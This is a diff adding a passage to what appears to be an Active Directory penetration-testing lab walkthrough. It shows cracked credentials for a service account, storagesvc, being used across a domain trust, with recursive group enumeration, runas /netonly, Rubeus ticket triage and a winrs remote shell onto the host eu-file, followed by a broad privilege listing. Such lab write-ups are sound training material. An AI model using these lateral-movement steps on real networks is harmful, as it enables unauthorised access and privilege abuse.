@@ -83,3 +83,157 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 
 ```
+
+
+Enumerate group membership for the new user storagesvc on the external domain eu.local:
+
+```
+PS C:\Users\studentuser17> function Get-ADPrincipalGroupMembershiprecursive ($SamAccountNname) {
+>> $groups=@(Get-ADPrincipalGroupMembership -Server eu.local -Identity $SamAccountNname | select -ExpandProperty distinguishedname)
+>> $groups
+>> if($groups.count -gt 0)
+>> {
+>> foreach ($group in $groups)
+>> {
+>> Get-ADPrincipalGroupMembershiprecursive $group
+>> }
+>> }
+>> }
+
+PS C:\Users\studentuser17> Get-ADPrincipalGroupMembershiprecursive  storagesvc
+CN=Domain Users,CN=Users,DC=eu,DC=local
+CN=eufileadmins,CN=Users,DC=eu,DC=local
+CN=Users,CN=Builtin,DC=eu,DC=local
+```
+
+Review group eufileadmins :
+
+```
+PS C:\Users\studentuser17> Get-ADGroup -Identity eufileadmins -Server eu.local -Properties *
+
+
+CanonicalName                   : eu.local/Users/eufileadmins
+CN                              : eufileadmins
+Created                         : 7/18/2019 10:26:55 PM
+createTimeStamp                 : 7/18/2019 10:26:55 PM
+Deleted                         :
+Description                     : eufileadmins
+DisplayName                     : eufileadmins
+DistinguishedName               : CN=eufileadmins,CN=Users,DC=eu,DC=local
+dSCorePropagationData           : {12/31/1600 4:00:00 PM}
+GroupCategory                   : Security
+GroupScope                      : Global
+groupType                       : -2147483646
+HomePage                        :
+instanceType                    : 4
+isDeleted                       :
+LastKnownParent                 :
+ManagedBy                       :
+member                          : {CN=storagesvc,CN=Users,DC=eu,DC=local}
+MemberOf                        : {}
+Members                         : {CN=storagesvc,CN=Users,DC=eu,DC=local}
+Modified                        : 7/18/2019 10:27:14 PM
+modifyTimeStamp                 : 7/18/2019 10:27:14 PM
+Name                            : eufileadmins
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  : CN=Group,CN=Schema,CN=Configuration,DC=eu,DC=local
+ObjectClass                     : group
+ObjectGUID                      : 59d88009-6725-4ce6-bf06-d59a5258bf76
+objectSid                       : S-1-5-21-3657428294-2017276338-1274645009-1108
+ProtectedFromAccidentalDeletion : False
+SamAccountName                  : eufileadmins
+sAMAccountType                  : 268435456
+sDRightsEffective               : 0
+SID                             : S-1-5-21-3657428294-2017276338-1274645009-1108
+SIDHistory                      : {}
+uSNChanged                      : 23321
+uSNCreated                      : 23316
+whenChanged                     : 7/18/2019 10:27:14 PM
+whenCreated                     : 7/18/2019 10:26:55 PM
+```
+Launch new cmd process with the storagesvc user credentials:
+
+```
+PS C:\Users\studentuser17> runas.exe /user:eu.local\storagesvc /netonly cmd
+Enter the password for eu.local\storagesvc:
+Attempting to start cmd as user "eu.local\storagesvc" ...
+```
+
+Access to the  new domain at machine eu-file:
+
+```
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+us\studentuser17
+
+C:\Windows\system32>klist
+
+Current LogonId is 0:0x21bdce
+
+Cached Tickets: (0)
+
+C:\Windows\system32>C:\AD\Tools\Rubeus.exe triage
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+
+Action: Triage Kerberos Tickets (Current User)
+
+[*] Current LUID    : 0x21bdce
+
+ ---------------------------------------
+ | LUID | UserName | Service | EndTime |
+ ---------------------------------------
+ ---------------------------------------
+
+
+C:\Windows\system32>winrs -r:eu-file.eu.local cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\storagesvc>whoami
+whoami
+eu\storagesvc
+
+C:\Users\storagesvc>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+```
